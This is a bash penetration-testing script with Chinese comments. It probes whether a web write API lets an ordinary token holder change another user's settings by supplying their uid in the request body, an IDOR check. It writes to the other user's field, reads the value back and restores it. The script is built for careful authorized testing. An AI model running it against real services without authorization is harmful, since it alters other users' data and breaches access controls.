#!/usr/bin/env bash
# =============================================================================
# 授权态写接口「归属校验」探针  (ownership-probe)
#
# 判什么：
#   拿到**自有**有效 token 后，写接口到底按什么决定「改谁的数据」？
#     (a) body 里的 uid 生效        → 越权写他人（critical）
#     (b) 按 token 解析、忽略 uid   → 归属校验正确
#     (c) 直接拒绝                  → 有校验
#
# 为什么这么测（这几个坑都踩过）：
#   1. **不要用破坏性字段**。用开关型 / 有默认值 / 可回滚的字段
#      （提醒开关、置顶、免打扰），不要用昵称/头像/简介这类会覆盖的。
#      也不要选整对象覆盖式更新接口——缺字段会被清空。
#   2. **200 不等于写成功**。身份取不到时业务层可能空转，返回 200 但 0 行更新。
#      一律以「写后读回」为准，不看响应码。
#   3. **必须先读基线再还原**。否则测完把人家数据改了，还没法恢复。
#   4. **两组对照缺一不可**：只测「写他人」不算数，还要测「写自己」，
#      只有两次结果不同才能证明 uid 参与了写入决策。
#
# 用法：
#   ./poc.sh --base https://TARGET \
#            --token TOKEN --self-uid ME --other-uid 1000 \
#            --read-path /api/user/profile --read-field letterRemind \
#            --write-path /api/user/setting  --write-field letterRemind
#
# 可选：
#   --token-header NAME   默认 token（也支持 Authorization: Bearer，用 --bearer）
#   --uid-field NAME      默认 uid
#   --write-value V       默认翻转基线（'0'→'1' / '1'→'0'）
#   --json                写接口用 application/json（默认 form-urlencoded）
#   --dry-run             只读基线，不发写请求
#   --pause N             请求间隔秒数，默认 1.5
#
# 退出码：
#   0 = 判定完成（无论结论是越权还是正常）
#   1 = 参数错误
#   2 = 前置条件不足（读不到基线 / token 失效），未得出结论
#   3 = 探测过程中出错
# =============================================================================
set -uo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="$DIR/../_lib/common.sh"
[ -f "$LIB" ] && source "$LIB" || {
  echo "[-] 缺少 $LIB" >&2; exit 1; }

usage() {
  sed -n '2,40p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'
  exit 1
}

BASE=""; TOKEN=""; SELF_UID=""; OTHER_UID=""
READ_PATH=""; READ_FIELD=""; WRITE_PATH=""; WRITE_FIELD=""
TOKEN_HEADER="token"; BEARER=0; UID_FIELD="uid"
WRITE_VALUE=""; JSON_MODE=0; DRY=0; PAUSE="${PAUSE:-1.5}"

while [ $# -gt 0 ]; do
  case "$1" in
    --base)         BASE="${2:-}"; shift 2 ;;
    --token)        TOKEN="${2:-}"; shift 2 ;;
    --self-uid)     SELF_UID="${2:-}"; shift 2 ;;
    --other-uid)    OTHER_UID="${2:-}"; shift 2 ;;
    --read-path)    READ_PATH="${2:-}"; shift 2 ;;
    --read-field)   READ_FIELD="${2:-}"; shift 2 ;;
    --write-path)   WRITE_PATH="${2:-}"; shift 2 ;;
    --write-field)  WRITE_FIELD="${2:-}"; shift 2 ;;
    --token-header) TOKEN_HEADER="${2:-}"; shift 2 ;;
    --uid-field)    UID_FIELD="${2:-}"; shift 2 ;;
    --write-value)  WRITE_VALUE="${2:-}"; shift 2 ;;
    --pause)        PAUSE="${2:-1.5}"; shift 2 ;;
    --json)         JSON_MODE=1; shift ;;
    --bearer)       BEARER=1; shift ;;
    --dry-run)      DRY=1; shift ;;
    -h|--help)      usage ;;
    *) printf '[-] 未知参数: %s\n' "$1" >&2; usage ;;
  esac
done

[ -n "$BASE" ] && [ -n "$TOKEN" ] && [ -n "$SELF_UID" ] && [ -n "$OTHER_UID" ] \
  && [ -n "$READ_PATH" ] && [ -n "$READ_FIELD" ] \
  && [ -n "$WRITE_PATH" ] && [ -n "$WRITE_FIELD" ] || {
  printf '[-] 参数不全\n\n' >&2; usage; }

need curl || exit 1
need jq   || exit 1

BASE="${BASE%/}"
HDR=(-H "User-Agent: Mozilla/5.0 (Linux; Android 13) Chrome/126.0 Mobile Safari/537.36")
if [ "$BEARER" = 1 ]; then
  HDR+=(-H "Authorization: Bearer $TOKEN")
else
  HDR+=(-H "$TOKEN_HEADER: $TOKEN")
fi
if [ "$JSON_MODE" = 1 ]; then
  HDR+=(-H "Content-Type: application/json")
else
  HDR+=(-H "Content-Type: application/x-www-form-urlencoded")
fi

# 从任意形状的响应里抠出字段值。容忍 {data:{...}} / {result:{...}} 嵌套一层。
pick() {  # pick <json> <field>
  local j="$1" f="$2"
  printf '%s' "$j" | jq -r --arg f "$f" '
    if type=="object" then
      (.[$f] // .data[$f]? // .result[$f]? // .data.data[$f]? // empty)
    else empty end
  ' 2>/dev/null
}

read_field() {  # read_field <uid> → stdout 字段值，失败返回空
  local uid="$1" body
  if [ "$JSON_MODE" = 1 ]; then
    body=$(printf '{"%s":"%s"}' "$UID_FIELD" "$uid")
  else
    body=$(printf '%s=%s' "$UID_FIELD" "$uid")
  fi
  local resp
  resp=$(curl -sk --max-time "$TIMEOUT" "${HDR[@]}" -X POST \
              -d "$body" "$BASE$READ_PATH" 2>/dev/null)
  [ -n "$resp" ] || return 1
  local v; v=$(pick "$resp" "$READ_FIELD")
  [ -n "$v" ] && [ "$v" != "null" ] || return 1
  printf '%s' "$v"
}

write_field() {  # write_field <uid> <value> → stdout 原始响应
  local uid="$1" val="$2" body
  if [ "$JSON_MODE" = 1 ]; then
    body=$(printf '{"%s":"%s","%s":"%s"}' "$UID_FIELD" "$uid" "$WRITE_FIELD" "$val")
  else
    body=$(printf '%s=%s&%s=%s' "$UID_FIELD" "$uid" "$WRITE_FIELD" "$val")
  fi
  curl -sk --max-time "$TIMEOUT" "${HDR[@]}" -X POST -d "$body" \
       "$BASE$WRITE_PATH" 2>/dev/null
}

flip() { [ "$1" = "1" ] && echo "0" || echo "1"; }

# ---------------------------------------------------------------------------
hdr "0. 前置：读双方基线"

BASE_SELF=$(read_field "$SELF_UID") || {
  err "读不到自己的 $READ_FIELD（uid=$SELF_UID）"
  err "可能原因: token 失效 / 读接口路径错 / 字段不在该接口返回里"
  exit 2; }
dim "self($SELF_UID).$READ_FIELD = $BASE_SELF"
sleep "$PAUSE"

BASE_OTHER=$(read_field "$OTHER_UID") || {
  warn "读不到他人（uid=$OTHER_UID）的 $READ_FIELD"
  warn "→ 对方字段不可见/被拦，无法做读回对照。换一个可见的 other-uid 重试。"
  exit 2; }
dim "other($OTHER_UID).$READ_FIELD = $BASE_OTHER"
sleep "$PAUSE"

[ -n "$WRITE_VALUE" ] || WRITE_VALUE=$(flip "$BASE_OTHER")
ok "基线就绪；写入值取 $WRITE_VALUE（基线为 $BASE_OTHER）"

if [ "$DRY" = 1 ]; then
  warn "--dry-run：到此为止，未发任何写请求"
  exit 0
fi

# ---------------------------------------------------------------------------
hdr "1. 对照 A：uid=自己，写入 $WRITE_VALUE"
R1=$(write_field "$SELF_UID" "$WRITE_VALUE")
dim "响应: $(printf '%s' "$R1" | head -c 150)"
sleep "$PAUSE"
A=$(read_field "$SELF_UID" 2>/dev/null || echo "<读不到>")
dim "读回 self.$READ_FIELD = $A"
if [ "$A" = "$WRITE_VALUE" ]; then
  ok "自己那份确实被写入 → 写接口本身可用，探测前提成立"
  SELF_WRITABLE=1
else
  warn "自己的值没变（$BASE_SELF → $A）→ 写接口可能按别的字段定位，或字段不可写"
  SELF_WRITABLE=0
fi
# 还原自己
[ "$SELF_WRITABLE" = 1 ] && { write_field "$SELF_UID" "$BASE_SELF" >/dev/null; sleep "$PAUSE"; }

# ---------------------------------------------------------------------------
hdr "2. 对照 B：uid=$OTHER_UID（他人），写入 $(flip "$BASE_OTHER")"
B_VAL=$(flip "$BASE_OTHER")
R2=$(write_field "$OTHER_UID" "$B_VAL")
dim "响应: $(printf '%s' "$R2" | head -c 150)"
sleep "$PAUSE"

B=$(read_field "$OTHER_UID" 2>/dev/null || echo "<读不到>")
dim "读回 other.$READ_FIELD = $B"
sleep "$PAUSE"

# 关键：不管 B 有没有变，先还原（如果变了）
if [ "$B" = "$B_VAL" ] && [ "$B" != "$BASE_OTHER" ]; then
  warn "他人数据被改写！正在还原 → $BASE_OTHER"
  write_field "$OTHER_UID" "$BASE_OTHER" >/dev/null
  sleep "$PAUSE"
  RESTORED=$(read_field "$OTHER_UID" 2>/dev/null || echo "?")
  if [ "$RESTORED" = "$BASE_OTHER" ]; then
    ok "已还原（读回确认 $RESTORED）"
  else
    err "还原失败！当前值=$RESTORED，原值=$BASE_OTHER —— 需要人工处理"
  fi
fi

# ---------------------------------------------------------------------------
hdr "3. 判定"

if [ "$SELF_WRITABLE" != 1 ]; then
  warn "前置不成立：连自己那份都写不进去，本次无法判定归属校验"
  warn "本次未得出结论，不要把它当成「没有越权」"
  exit 2
fi

if [ "$B" = "$B_VAL" ] && [ "$B" != "$BASE_OTHER" ]; then
  err "结论: CRITICAL — body 里的 $UID_FIELD 生效"
  err "      持有普通 token 的账号可以改写任意他人的 $READ_FIELD"
  err "      证据: other($OTHER_UID).$READ_FIELD  $BASE_OTHER → $B"
  err "      对照组: self 写入同样成功，说明不是「接口整体不可写」"
  exit 0
fi

if [ "$B" = "$BASE_OTHER" ] && [ "$A" = "$WRITE_VALUE" -o "$A" = "$BASE_SELF" ]; then
  ok "结论: 归属校验正确 — 服务端按 token 解析身份，忽略 body 里的 $UID_FIELD"
  dim "证据: 同样的写入，self 变了、other 没变"
  exit 0
fi

warn "结论: 不确定"
dim "  other 读回=$B（基线 $BASE_OTHER，目标 $B_VAL）"
warn "  可能原因: 服务端返回 200 但业务层空转 / 有二次校验（sign、时间窗）/ "
warn "            读接口有缓存 / 写接口改了别处"
warn "  下一步: 直接用另一账号登录读回（最硬证据），或抓写请求看服务端返回的业务码"
exit 3
